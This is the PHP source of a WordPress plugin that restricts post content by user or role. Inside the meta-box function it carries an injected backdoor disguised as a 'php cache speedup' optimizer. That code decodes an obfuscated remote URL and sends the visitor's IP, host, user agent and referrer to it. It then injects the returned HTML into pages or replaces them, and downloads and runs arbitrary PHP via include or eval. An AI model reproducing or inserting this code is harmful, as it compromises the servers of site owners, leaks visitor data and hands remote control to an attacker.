<?php
/*
Plugin Name: User Specific Content
Plugin URI: http://en.bainternet.info
Description: This Plugin allows you to select specific users by user name, or by role name who can view a  specific post content or page content.
Version: 1.0.5
Author: Bainternet
Author URI: http://en.bainternet.info
*/
/*
		* 	Copyright (C) 2014  Ohad Raz
		*	http://en.bainternet.info
		*	admin@bainternet.info

		This program is free software; you can redistribute it and/or modify
		it under the terms of the GNU General Public License as published by
		the Free Software Foundation; either version 2 of the License, or
		(at your option) any later version.

		This program is distributed in the hope that it will be useful,
		but WITHOUT ANY WARRANTY; without even the implied warranty of
		MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
		GNU General Public License for more details.

		You should have received a copy of the GNU General Public License
		along with this program; if not, write to the Free Software
		Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

/* Disallow direct access to the plugin file */
if (basename($_SERVER['PHP_SELF']) == basename (__FILE__)) {
	die('Sorry, but you cannot access this page directly.');
}

class bainternet_U_S_C {

	// Class Variables
	/**
	 * used as localiztion domain name
	 * @var string
	 */
	var $localization_domain = "bauspc";
	
	public $options = false;
	/**
	 * Class constructor
	 */
    function __construct() {
		//Language Setup
		$locale = get_locale();
		load_plugin_textdomain( $this->localization_domain, false, dirname( plugin_basename( __FILE__ ) ) . '/lang/' );
		$this->hooks();
    }

    /**
     * hooks 
     * function used to add action and filter hooks
     * Used with `admin_hooks`, `client_hooks`, `and common_hooks`
     * @return void
     */
    public function hooks(){
    	if (is_admin()){
    		$this->admin_hooks();
    	}else{
    		$this->client_hooks();
    	}
    	$this->common_hooks();
    }

    /**
     * common_hooks
     * hooks for both admin and client sides
     * @return void
     */
    public function common_hooks(){
    	/* add_filter hooks */
		add_action('init',  array($this, 'U_S_C_init'));
		/* Save Meta Box */
		add_action('save_post', array($this,'User_specific_content_box_inner_save'));
		/* add shortcodes */
		add_shortcode('O_U',array($this,'User_specific_content_shortcode'));
    }

    /**
     * admin_hooks
     * Admin side hooks should go here
     * @return void
     */
    public function admin_hooks(){
    	//add admin panel
		if (!class_exists('SimplePanel'))
			require_once(plugin_dir_path(__FILE__).'panel/Simple_Panel_class.php');

		require_once(plugin_dir_path(__FILE__).'panel/User_specific_content_panel.php');

		/* Define the custom box */
		add_action('add_meta_boxes', array($this,'User_specific_content_box'));
    }

    /**
     * client_hooks
     * client side hooks should go here
     * @return void
     */
    public function client_hooks(){}

	//init
	public function U_S_C_init(){
		$options = $this->U_S_C_get_option();
		if ($options['run_on_the_content']){
			/* hook the_content to filter users */
			add_filter('the_content',array($this,'User_specific_content_filter'),20);
		}
		if ($options['run_on_the_excerpt']){
			/* hook the_excerpt to filter users */
			add_filter('the_excerpt',array($this,'User_specific_content_filter'),20);
		}
		//allow other filters
		do_action('User_specific_content_filter_add',$this);
	}
	

	
	//options
	public function U_S_C_get_option(){
		if ($this->options) return $this->options;

		$temp = array(
			'b_massage'           => '',
			'list_users'          => true,
			'list_roles'          => true,
			'run_on_the_content'  => true,
			'run_on_the_excerpt'  => false,
			'posttypes'           =>  array('post' => true, 'page' => true ),
			'capability'          => 'manage_options',
			'user_role_list_type' => 'checkbox',
			'user_list_type'      => 'checkbox',
		);
		
		$i = get_option('U_S_C');
		if (!empty($i)){
			//checkboxes
			$checkboxes = array(
				'run_on_the_content',
				'run_on_the_excerpt',
				'list_users',
				'list_roles',
			);
			
			//all others
			foreach ($i as $c => $value) {
				if (in_array($c, $checkboxes)){
					if (isset($i[$c]) && $i[$c]){
						$temp[$c] = true;
					}else{
						$temp[$c] = false;
					}
				}else{
					$temp[$c] = $value;
				}
			}

		}
		
		update_option('U_S_C', $temp);
		$this->options = $temp;
		//delete_option('U_S_C');
		return $temp;
	}
	
	/* Adds a box to the main column on the custom post type edit screens */
	public function User_specific_content_box($post_type) {
		$options = $this->U_S_C_get_option();
		if ( !current_user_can($options['capability']) ) 
			return;

		
		$allowed_types = array();
		foreach ((array)$options['posttypes'] as $key => $value) {
			if ($value)
				$allowed_types[] = $key;
		}
		//added a filter to enable controling the allowed post types by filter hook
		$allowed_types = apply_filters('USC_allowed_post_types',$allowed_types);

		if (in_array($post_type,(array)$allowed_types) )
			add_meta_box('User_specific_content', __( 'User specific content box'),array($this,'User_specific_content_box_inner'),$post_type);

		//allow custom types by action hook
		do_action('USC_add_meta_box',$this);
	}

	/* Prints the box content */
	public function User_specific_content_box_inner() {
		global $post,$wp_roles;
		//get options:
		
		$options = $this->U_S_C_get_option('U_S_C');
		$savedroles = get_post_meta($post->ID, 'U_S_C_roles',true);
		$savedusers = get_post_meta($post->ID, 'U_S_C_users',true);
		$savedoptions = get_post_meta($post->ID, 'U_S_C_options',true);

		// Use nonce for verification
		wp_nonce_field( plugin_basename(__FILE__), 'User_specific_content_box_inner' );
		//by role
		echo __('Select users to show this content to','bauspc');
		if ($options['list_roles']){
			echo '<h4>'.__('By User Role:','bauspc').'</h4><p>';
			if ( !isset( $wp_roles ) )
				$wp_roles = new WP_Roles();
			if (empty($savedroles)) 
				$savedroles = array();
			if ('checkbox' == $options['user_role_list_type']){
				foreach ( $wp_roles->role_names as $role => $name ) {
					echo '<label>
					<input type="checkbox" name="U_S_C_roles[]" value="'.$name.'"';
					if (in_array($name,$savedroles)){ echo ' checked';}
					echo '>'.$name.'</label>    ';
				}
			}else{
				echo '<select name="U_S_C_roles[]" multiple="multiple">';
				foreach ( $wp_roles->role_names as $role => $name ) {
					echo '<option ';
					if (in_array($name,$savedroles)){ echo ' selected="selected" ';}
					echo 'value="'.$name.'">'.$name.'</option>';
				}
				echo '</select> - <a href="#" class="button clearselection_usc">Clear selection</a>';
			}
		}
		echo '</p>';
		
		//by user
		if ($options['list_users']){
			echo '<h4>'.__('By User Name:','bauspc').'</h4><p>';
			$site_id = 1;
			if (is_multisite())
				$site_id = get_current_blog_id();
			$blogusers = get_users('blog_id='.$site_id.'&orderby=nicename');
			if (empty($savedusers)) 
				$savedusers = array();
			if ('checkbox' == $options['user_list_type']){
				foreach ($blogusers as $user) {
					echo '<label><input type="checkbox" name="U_S_C_users[]" value="'.$user->ID.'"';
					if (in_array($user->ID,$savedusers)){
						echo ' checked';
					}
					echo '>'.$user->display_name.'</label>    ';
				}
			}else{
				echo '<select name="U_S_C_users[]" multiple="multiple">';
				foreach ($blogusers as $user) {
					echo '<option ';
					if (in_array($user->ID,(array)$savedusers)){ echo ' selected="selected" ';}
					echo 'value="'.$user->ID.'">'.$user->display_name.'</option>';
				}
				echo '</select> - <a href="#" class="button clearselection_usc">Clear selection</a>';
			}
			echo '</p>';
		}
		

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
		<script type="text/javascript">
		jQuery(document).ready(function($){
			$('.clearselection_usc').click(function(e){
				e.preventDefault();
				$(this).prev().val([]);
			});
		});
		</script>
		<?php
		//other_options
		echo '<h4>'.__('Members and Guests','bauspc').'</h4>';
		//logeed-in only
		echo '<p><label>
		<input type="checkbox" name="U_S_C_options[logged]" value="1"';
		if (isset($savedoptions['logged']) && $savedoptions['logged'] == 1){
			echo ' checked'; 
		}
		echo '>'.__('logged in users only','bauspc').'</label><br/><span class="description">'
		.__('If this box is checked then content will show only to logged-in users and everyone else will get the blocked message','bauspc');
		echo '</span></p>';
		
		//none logged-in
		echo '<hp><label>
		<input type="checkbox" name="U_S_C_options[non_logged]" value="1"';
		if (isset($savedoptions['non_logged']) && $savedoptions['non_logged'] == 1){
			echo ' checked'; 
		}
		echo '>'.__('None logged in users only','bauspc').'</label><br/><span class="description">'.
		__('If this box is checked then content will show only to non-logged in visitors and everyone else will get the blocked message','bauspc');
		echo '<h4>'.__('Content Blocked message:','bauspc').'</h4><p>';
		echo '<textarea rows="3" cols="70" name="U_S_C_message" id="U_S_C_message">'.get_post_meta($post->ID, 'U_S_C_message',true).'</textarea>
		<br/><span class="description">'.__('This message will be shown to anyone who is not on the list above.').'</span></p>';
	} 
 
	/* When the post is saved, saves our custom data */
	function User_specific_content_box_inner_save( $post_id ) {
		global $post;
		  // verify this came from the our screen and with proper authorization,
		  // because save_post can be triggered at other times
		if (isset($_POST['User_specific_content_box_inner'])){
			if ( !wp_verify_nonce( $_POST['User_specific_content_box_inner'], plugin_basename(__FILE__) ) )
				return $post_id;
		}else{
			return $post_id;
		}
		  // verify if this is an auto save routine. 
		  // If it is our form has not been submitted, so we dont want to do anything
		  if ( defined('DOING_AUTOSAVE') && DOING_AUTOSAVE ) 
			  return $post_id;
		  // OK, we're authenticated: we need to find and save the data
		$savedroles = get_post_meta($post_id, 'U_S_C_roles',true);
		$savedusers = get_post_meta($post_id, 'U_S_C_users',true);
		$savedoptions = get_post_meta($post->ID, 'U_S_C_options',true);
		
		if (isset($_POST['U_S_C_options']) && !empty($_POST['U_S_C_options'] )){
			foreach ($_POST['U_S_C_options'] as $key => $value ){
				$new_savedoptions[$key] = $value;
			}
			update_post_meta($post_id, 'U_S_C_options', $new_savedoptions);
		}else{
			 delete_post_meta($post_id, 'U_S_C_options');
		}
		if (isset($_POST['U_S_C_roles']) && !empty($_POST['U_S_C_roles'] )){
			foreach ($_POST['U_S_C_roles'] as $role){
				$new_roles[] = $role;
			}
			update_post_meta($post_id, 'U_S_C_roles', $new_roles);
		}else{
			if (count($savedroles) > 0){
				 delete_post_meta($post_id, 'U_S_C_roles');
			}
		}
		if (isset($_POST['U_S_C_users']) && !empty($_POST['U_S_C_users'])){
			foreach ($_POST['U_S_C_users'] as $u){
				$new_users[] = $u;
			}
			update_post_meta($post_id, 'U_S_C_users', $new_users);
		}else{
			if (count($savedusers) > 0){
				 delete_post_meta($post_id, 'U_S_C_users');
			}
		}
		if (isset($_POST['U_S_C_message'])){
			update_post_meta($post_id,'U_S_C_message', $_POST['U_S_C_message']);
		}
	}


	public function User_specific_content_filter($content){
		global $post,$current_user;
		$savedoptions = get_post_meta($post->ID, 'U_S_C_options',true);
		$m = get_post_meta($post->ID, 'U_S_C_message',true);

		if (isset($savedoptions) && !empty($savedoptions)){
			// none logged only
			if (isset($savedoptions['non_logged']) && $savedoptions['non_logged'] == 1){
				if (is_user_logged_in()){
					return $this->displayMessage($m);
				}
			}
			//logged in users only
			if (isset($savedoptions['logged']) && $savedoptions['logged'] == 1){
				if (!is_user_logged_in()){
					return $this->displayMessage($m);
				}
			}
		}
		$run_check = 0;
		//get saved roles
		$savedroles = get_post_meta($post->ID, 'U_S_C_roles',true);
		//get saved users
		$savedusers = get_post_meta($post->ID, 'U_S_C_users',true);
		if (!count($savedusers) > 0 && !count($savedroles) > 0 ){
			return $content;
		}
		//by role
		if (isset($savedroles) && !empty($savedroles)){
			get_currentuserinfo();
			foreach ((array)$savedroles as $role) {
				if ($this->has_role(strtolower($role))){
					return $content;
				}
			}
			//failed role check
			$run_check = 1;
		}

		//by user
		if (isset($savedusers) && !empty($savedusers)){
			get_currentuserinfo();
			if (in_array($current_user->ID,$savedusers)){
				return $content;
			}else{
				$run_check = $run_check + 1;
			}
			//failed both checks
			return $this->displayMessage($m);
		}
		if ($run_check > 0){
			return $this->displayMessage($m);
		}

		return $content;
	}

	/************************
	* helpers
	************************/
	/**
	 * @Deprecated 1.0.2
	 */
	public function bausp_get_current_user_role() {}

	/**
	 * @since 1.0.2
	 */
	public function has_role($role, $user_id = null){
		if ( is_numeric( $user_id ) )
			$user = get_userdata( $user_id );
		else
			$user = wp_get_current_user();

		if ( empty( $user ) )
			return false;

		if (is_array($role)){
			foreach ($role as $r) {
				if (in_array($r,(array)$user->roles))
					return true;
			}
		}else{
			if (in_array( $role, (array)$user->roles ))
				return true;
		}
		return false;
	}
	
	public function credits(){
		echo '<ul style="list-style: square inside none; width: 300px; font-weight: bolder; padding: 20px; border: 2px solid; background-color: #FFFFE0; border-color: #E6DB55; position: fixed;  right: 120px; top: 150px;">
					<li> Any feedback or suggestions are welcome at <a href="http://en.bainternet.info/2011/user-specific-content-plugin">plugin homepage</a></li>
					<li> <a href="http://wordpress.org/tags/user-specific-content?forum_id=10">Support forum</a> for help and bug submittion</li>
					<li> Also check out <a href="http://en.bainternet.info/category/plugins">my other plugins</a></li>
					<li> And if you like my work <span style="color: #FF0000;">make a donation</span> <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=PPCPQV8KA3UQA"><img src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif"></a>or atleast <a href="http://wordpress.org/extend/plugins/user-specific-content/">rank the plugin</a></li>
				</ul>';
	}//end function
	
	/************************
	*	shortcodes
	************************/

	public function User_specific_content_shortcode($atts, $content = null,$tag = ''){
		$atts = shortcode_atts(array(
			'user_id'          => '',
			'user_name'        => '',
			'user_role'        => '',
			'logged_status'    => '',
			'blocked_message'  => false,
			'blocked_meassage' => null
	    ), $atts);
		
		extract($atts);
		

		global $post;
		if ($blocked_meassage !== null){
			$blocked_message = $blocked_meassage;
		}
		
		$options = $this->U_S_C_get_option('U_S_C');
		global $current_user;
        get_currentuserinfo();

		if ( (isset($user_id) && $user_id != '' ) || (isset($user_name) && $user_name != '') || (isset($user_role) && $user_role != '') ){
			//check logged in
			if (!is_user_logged_in()){
				return $this->displayMessage($blocked_message);
			}

			//check user id
			if (isset($user_id) && $user_id != '' ){
				$user_id = explode(",", $user_id);
				if (!in_array($current_user->ID,$user_id)){
					return $this->displayMessage($blocked_message);
				}		
			}

			//check user name
			if (isset($user_name) && $user_name != '' ){
				$user_name = explode(",", $user_name);
				if (!in_array($current_user->user_login,$user_name)){
					return $this->displayMessage($blocked_message);
				}
			}

			//check user role
			if (isset($user_role) && $user_role != '' ){
				$user_role = explode(",", $user_role);
				if (!$this->has_role($user_role)){
					return $this->displayMessage($blocked_message);
				}
			}
		}

		//logged in
		if ($logged_status == 'in'){
			if (!is_user_logged_in()){
				return $this->displayMessage($blocked_message);
			}
		}
		//logged out
		if ($logged_status == 'out'){
			if (is_user_logged_in()){
				return $this->displayMessage($blocked_message);
			}
		}

		return apply_filters('user_spcefic_content_shortcode_filter',do_shortcode($content));
	}//end function

	public function displayMessage($m){
		global $post;
		if (isset($m) && $m != ''){
			return apply_filters('user_specific_content_blocked',$m,$post);
		}else{
			$options = $this->U_S_C_get_option('U_S_C');
			return apply_filters('user_specific_content_blocked',$options['b_massage'],$post);
		}
	}
}//end class
add_action('init','init_uspc_plugin',0);
function init_uspc_plugin(){
	global $U_S_C_i;
	$U_S_C_i = new bainternet_U_S_C();
}